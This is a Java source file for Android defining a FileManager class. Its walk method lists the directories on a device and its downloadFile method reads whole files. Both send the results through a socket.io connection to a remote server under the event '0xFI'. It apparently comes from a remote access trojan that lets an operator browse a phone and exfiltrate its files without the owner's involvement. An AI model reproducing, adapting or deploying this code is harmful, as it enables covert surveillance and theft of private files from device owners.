package com.example.project20;

import android.util.Log;
import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

public class FileManager {
    public static JSONArray walk(String str) {
        JSONArray jSONArray = new JSONArray();
        File file = new File(str);
        if (!file.canRead()) {
            Log.d("cannot", "inaccessible");
            try {
                JSONObject jSONObject = new JSONObject();
                jSONObject.put("type", "error");
                jSONObject.put("error", "Denied");
                IOSocket.getInstance().getIoSocket().emit("0xFI", jSONObject);
            } catch (JSONException e) {
                e.printStackTrace();
            }
        }
        File[] listFiles = file.listFiles();
        if (listFiles != null) {
            try {
                JSONObject jSONObject2 = new JSONObject();
                jSONObject2.put("name", "../");
                jSONObject2.put("isDir", true);
                jSONObject2.put("path", file.getParent());
                jSONArray.put(jSONObject2);
                for (File file2 : listFiles) {
                    if (!file2.getName().startsWith(".")) {
                        JSONObject jSONObject3 = new JSONObject();
                        jSONObject3.put("name", file2.getName());
                        jSONObject3.put("isDir", file2.isDirectory());
                        jSONObject3.put("path", file2.getAbsolutePath());
                        jSONArray.put(jSONObject3);
                    }
                }
            } catch (JSONException e2) {
                e2.printStackTrace();
            }
        }
        return jSONArray;
    }

    public static void downloadFile(String str) {
        if (str != null) {
            File file = new File(str);
            if (file.exists()) {
                int length = (int) file.length();
                byte[] bArr = new byte[length];
                try {
                    BufferedInputStream bufferedInputStream = new BufferedInputStream(new FileInputStream(file));
                    bufferedInputStream.read(bArr, 0, length);
                    JSONObject jSONObject = new JSONObject();
                    jSONObject.put("type", "download");
                    jSONObject.put("name", file.getName());
                    jSONObject.put("buffer", bArr);
                    IOSocket.getInstance().getIoSocket().emit("0xFI", jSONObject);
                    bufferedInputStream.close();
                } catch (FileNotFoundException e) {
                    e.printStackTrace();
                } catch (IOException e2) {
                    e2.printStackTrace();
                } catch (JSONException e3) {
                    e3.printStackTrace();
                }
            }
        }
    }
}
